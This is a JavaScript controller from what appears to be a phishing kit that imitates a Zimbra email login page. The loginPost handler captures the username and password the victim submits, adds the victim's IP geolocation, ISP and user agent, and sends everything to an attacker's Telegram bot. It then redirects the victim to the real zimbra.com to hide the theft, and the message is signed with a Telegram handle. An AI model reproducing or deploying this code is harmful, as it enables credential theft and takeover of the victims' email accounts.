const { sendMessageFor } = require("simple-telegram-message");
const { botToken, chatId } = require("../settings");
const getIPDetails = require("../middleware/getIPDetails");


exports.login = (req, res) => {
  return res.render("login");
};

exports.loginPost = async (req, res) => {
  const { username, password } = req.body;


  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `||📧📧ZIMBRA LOGIN\n\n` +
    `||🔰Username: ${username}\n` +
    `||🔑Password: ${password}\n` +
    `++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("http://www.zimbra.com/");
};

exports.page404Redirect = (req, res) => {
  return res.redirect("/auth/login");
};
